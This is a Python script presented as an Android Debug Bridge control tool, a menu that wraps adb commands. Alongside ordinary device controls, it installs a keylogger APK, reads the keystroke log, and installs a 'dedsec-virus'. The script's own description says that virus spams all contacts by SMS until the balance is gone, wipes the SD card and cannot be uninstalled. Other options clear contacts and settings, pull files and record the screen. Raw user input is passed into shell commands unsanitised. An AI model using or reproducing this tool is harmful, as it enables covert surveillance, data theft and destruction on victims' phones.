#!/bin/python
# -*- coding: utf-8 -*-

#CODED BY OXBIT

import os
import time

print("")
print("""
     ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗     █████╗ ██████╗ ██████╗ 
     ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔══██╗
     ██║  █0XBIT██╗  ██║  ██║███████╗█████╗  ██║         ███████║██║  ██║██████╔╝
     ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║         ██╔══██║██║  ██║██╔══██╗
     ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗    ██║  ██║██████╔╝██████╔╝
     ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝  ╚═╝╚═════╝ ╚═════╝ """)
print("           [*] DEDSEC ANDROID DEBUG BRIDGE TOOL  |  CODED BY OXBIT [*]      ")
print("")

def banner_option():
	print("""
[*]--------------------------------------------------------------------------------[*]
 | 1 - Home                   21 - netstat              41 - install keylogger      |
 | 2 - back                   22 - clear contacts       42 - read keystroke         |
 | 3 - call botton            23 - clear settings       43 - monkey                 |
 | 4 - end call               24 - reboot               44 - install dedsec-virus   |
 | 5 - power botton           25 - adb shell            45 - install anti-dedsec    |
 | 6 - camera                 26 - download file        46 - send keystroke         |
 | 7 - decrease brightness    27 - upload file          47 - send sms               |
 | 8 - increase brightness    28 - screenrecord                                     |
 | 9 - sleep                  29 - install app from desktop                         |
 | 10 - wakeup                30 - disconnect device                                |
 | 11 - sys status            31 - play troll music                                 |
 | 12 - screenshot            33 - control phone                                    |
 | 13 - battery %             32 - open link                                        |
 | 14 - sys process           34 - list device file                                 |
 | 15 - app list              35 - find app package name                            |
 | 16 - clear data app        36 - bootloader                                       |
 | 17 - uninstall app         37 - fastboot                                         |
 | 18 - play/pause music      38 - mute                                             |
 | 19 - run app               39 - volume up                                        |
 | 20 - device ip             40 - volume down                                      |
[*]--------------------------------------------------------------------------------[*]
 | 01 - start = via usb cable connection     04 - help                              |
 | 02 - start = via wifi connection          05 - about                             |
 | 03 - Exit                                 06 - sosial media                      |
[*]--------------------------------------------------------------------------------[*]
""")

def virus_about():
	print ("""[*]---------------------------------------------------------------------[*]
            	[*] ANDROID VIRUS:  DEDSEC-VIRUS [*]\n
DEDSEC-VIRUS is an android virus and anti-dedsec is an anti-virus that has features as mentioned below.\n

[*] DEDSEC-VIRUS : Android Virus Features:-\n

    Send sms continuously from the device to all phone contacts randomly till mobile balance is nil.\n
    Block sms messenger, etc apps.\n
    Wipe out sd-card data completely.\n
    Hide app icon from app launcher as well as recent category.\n
    Cannot uninstalling this virus app from application manager.\n
    Run in background continuously and gets restarted even after device is turned ON/OFF.\n
    Track the user's interaction by retrieving the applications that user has started.\n 

[*] ANTI-DEDSEC : Android Anti-Virus Features:-\n

    The only solution to uninstall Elite virus from infected mobile.\n
    It forces to uninstall, so that it can be made one time use only.\n
    
[*]----------------------------------------------------------------------- [*]\n""")

def monkey():
	print("""[*] What is Monkey [*]\n
Monkey is a command line tool that runs over ADB shell command line.\nIt generates N number of random events such as random touches, gesture, system level events, etc.\nand sends to the system or app which you want to test.\n""")

def adb():
	print("""
To use ADB with your Android device, you must enable a feature called “USB Debugging”\n Open your phone’s app drawer, tap the Settings icon, and select “About Phone”.\nScroll all the way down and tap the “Build Number” item seven times. You should get a message saying you are now a developer.\n

Head back to the main Settings page, and you should see a new option in the “System”\n section called “Developer Options.” Open that, and enable “USB Debugging.”\n

-------------------------------------------------------------------------------

[*] to use scrcpy feature 
[*] install scrcpy first : sudo apt install scrcpy

-------------------------------------------------------------------------------

""")

def about():
	print("""
------------------------------------------------------------------------------------
What is Android Debug Bridge (ADB)?\n

Android Debug Bridge (ADB) is a command-line tool that allows you to communicate with a\n device. It is used to bridge communication between an emulator instance (Android device)\nand the background running daemon process (server). It helps you perform different actions\nlike installing or debugging a device and run various commands on a device by providing access to a Unix shell.\n
------------------------------------------------------------------------------------
		""")


def social():
	print("""
[*]-------------------------------------------------------[*]

YOUTUBE  : https://youtu.be/HEN9XuCs1cU
TWITTER  : https://twitter.com/0xbit1
DISCORD  : https://discord.gg/sXvQw9KfeJ
GITHUB   : https://github.com/0xbitx 

[*]-------------------------------------------------------[*]
		""")

def start():
	print("[*]Connect your phone via usb cable first[*]")
	time.sleep(4)
	print("")
	print("[*]ADB status.")
	os.system("adb devices -l")

def start1():
	os.system("adb usb")
	time.sleep(2)
	os.system("adb devices -l")

def wifi():
	print("")
	print ("[*]Connect your device to same network first [*]")
	print("")
	print ("[*]--------------------------[*]")
	os.system("nmcli d")
	print ("[*]--------------------------[*]")
	print("")
	time.sleep(3)
	ip = input("WIFI IP: ")
	time.sleep(1)
	print("[*]SCANNING NETWORK...[*]")
	os.system("nmap -sP "+ip+"/24")
	os.system("adb tcpip 5555")
	print("")
	ip = input("DEVICE IP:")
	os.system("adb devices -l")
	os.system("adb connect " +ip+ ":5555")
	os.system("adb devices -l")
	print("[*]now remove usb cable from your device")
	print("[*]Enjoy using your device via wifi connection.")

start()

while True:
	banner_option()
	print("")
	command = input("[*] Command>: ")
	
	if command == "1":
		os.system("adb shell input keyevent 3")
	
	elif command == "2":
		os.system("adb shell input keyevent 4")
	
	elif command == "3":
		os.system("adb shell input keyevent 5")
	
	elif command == "4":
		os.system("adb shell input keyevent 6")
	
	elif command == "5":
		os.system("adb shell input keyevent 26")
	
	elif command == "6":
		os.system("adb shell input keyevent 27")
	
	elif command == "7":
		os.system("adb shell input keyevent 220")
	
	elif command == "8":
		os.system("adb shell input keyevent 221")
	
	elif command == "9":
		os.system("adb shell input keyevent KEYCODE_SLEEP")
	
	elif command == "10":
		os.system("adb shell input keyevent KEYCODE_WAKEUP")
	
	elif command == "11":
		os.system("adb shell getprop")
	
	elif command == "12":
		print("example: /home/username/Desktop")
		dump = input("your machine location: ")
		os.system("adb shell screencap /sdcard/screencap.png")
		os.system("adb pull /sdcard/screencap.png " +dump )
	
	elif command == "13":
		os.system("adb shell dumpsys battery")
		
	elif command == "14":
		print("")
		print("[*] Crtl C to stop ")
		time.sleep(2)
		os.system("adb shell dumpsys")
	
	elif command == "15":
		print("[*]THIRD PARTY APP [*]")
		print("")
		time.sleep(1)
		os.system("adb shell pm list packages -3")
		time.sleep(1)
		print("")
		print("[*]SYSTEM APP[*]")
		print("")
		time.sleep(1)
		os.system("adb shell pm list packages -s")
	
	elif command == "16":
		app = input("package name: ")
		os.system("adb shell pm clear " +app)
	
	
	elif command == "17":
		app = input("package name: ")
		os.system("adb shell pm uninstall -k --user 0 " +app)
	
	
	elif command == "18":
		os.system("adb shell input  keyevent 85")
	
	elif command == "19":
		app = input("package name: ")
		os.system("adb shell monkey -p "+app+ " -c android.intent.category.LAUNCHER 1")
	
	elif command == "20":
		os.system("adb shell ip addr")
	
	elif command == "21":
		os.system("adb shell netstat")
	
	elif command == "22":
		os.system("adb shell pm clear com.android.providers.contacts")
	
	elif command == "23":
		os.system("adb shell pm clear com.android.settings")
	
	elif command == "24":
		os.system("adb reboot -p")
	
	elif command == "25":
		os.system("adb shell")
	
	elif command == "26":
		print("example: phone location /sdcard/Pictures/duterte.png")
		phone_file = input("phone files location: ")
		print("example: machine location /home/username/Desktop")
		move_loc = input("your machine location: ")
		os.system("adb pull "+phone_file+ " " +move_loc)
		
	elif command == "27":
		print("example: /home/username/Desktop/porn.mp4")
		yfile = input("your file location: ")
		print("example: phone location /sdcard/Movies")
		phone_loc = input("phone location: ")
		os.system("adb push " +yfile+ " " +phone_loc)
		
	elif command == "28":
		print("Set the maximum recording time, in seconds.")
		time = input("time:")
		print("example: /home/username/Desktop")
		location = input("your machine location: ")
		os.system("adb shell screenrecord --time-limit="+time+" /sdcard/rec.mp4")
		os.system("adb pull /sdcard/rec.mp4 "+location+"/rec.mp4")
		os.system("adb shell rm /sdcard/rec.mp4")
	
	elif command == "29":
		print("example: /home/username/Desktop/facebook.apk")
		app = input("your app location: ")
		os.system("adb push " +app+ " /sdcard/")
		print("example: facebook.apk")
		app_name = input("app name to install:")
		os.system("adb install " +app_name)
	
	elif command == "30":
		ip = input("device IP:")
		os.system("adb disconnect " +ip+":5555")
		print("")
	
	elif command == "31":
		print("[*] play wav file [*]")
		print("")
		wav = input("your wav file location: ")
		os.system("adb push "+wav+" /sdcard/")
		os.system("adb shell am start -a android.intent.action.VIEW -d file:///sdcard/troll.wav -t audio/wav")
	
	elif command == "32":
		print("example: https://www.facebook.com")
		link = input("link: ")
		os.system("adb shell am start -a android.intent.action.VIEW -d "+link)
	
	elif command == "33":
		print("")
		print(" [*] TO INSTALL SCRCPY [*] :\n sudo apt install scrcpy")
		print("")
		time.sleep(2)
		os.system("scrcpy")

	elif command == "34":
		print("example: /sdcard/")
		loc = input("device path:")
		os.system("adb shell ls "+loc)
	
	elif command == "35":
		print("example: facebook")
		name = input("app name: ")
		print("[*] APP PACKAGE NAME [*]")
		os.system("adb shell pm list packages " +name)
		print("")
	
	elif command == "36":
		os.system("adb reboot-bootloader")
	
	elif command == "37":
		os.system("adb reboot fastboot")
	
	elif command == "38":
		os.system("adb shell input keyevent KEYCODE_MUTE")
	
	elif command == "39":
		os.system("adb shell input keyevent KEYCODE_VOLUME_UP")
			
	elif command == "40":
		os.system("adb shell input keyevent KEYCODE_VOLUME_DOWN")
	
	elif command == "41":
		print("example: /sdcard/")
		location = input("device location: ")
		os.system("adb push keylog.apk" +location)
		os.system("adb install keylog.apk")
	
	elif command == "42":
		os.system("adb shell cat /sdcard/Android/data/com.abifog.lokiboard/files/lokiboard-files.txt")
	
	elif command == "43":
		monkey()
		app = input("package name: ")
		os.system("adb shell monkey -p "+app+" -v 10000 -s 100")
	
	elif command == "44":                              ##virus
		virus_about()
		print("example: /sdcard")
		location = input("[*]device location: ")
		os.system("adb push dedsec_virus.apk " +location)
		os.system("adb install dedsec_virus.apk")
	
	elif command == "45":                             ##antivirus
		virus_about()
		print("example: /sdcard")
		location = input("[*] device location: ")
		os.system("adb push anti_dedsec.apk " +location)
		os.system("adb install anti_dedsec.apk")
	
	elif command == "46":
		sms = input("text: ")
		os.system("""adb shell "input keyboard text '"""  +sms+  """'" """)
		os.system("adb shell input keyevent 66")
		
	elif command == "47":
		print("Example: 09774587399")
		num = input("Phone number: ")
		print("")
		sms = input("message: ")
		os.system("""adb shell am start -a android.intent.action.SENDTO -d sms:"""+num+""" --es sms_body '"""+sms+"""' --ez exit_on_sent true""")
		os.system("adb shell input keyevent 61")
		os.system("adb shell input keyevent 66")
	
	elif command == "01":
		start1()
	elif command == "02":
		wifi()
	elif command == "03":
		os.system("adb kill-server")
		os.close()
	elif command == "04":
		adb()
	
	elif command == "05":
		about()
	
	elif command == "06":
		social()

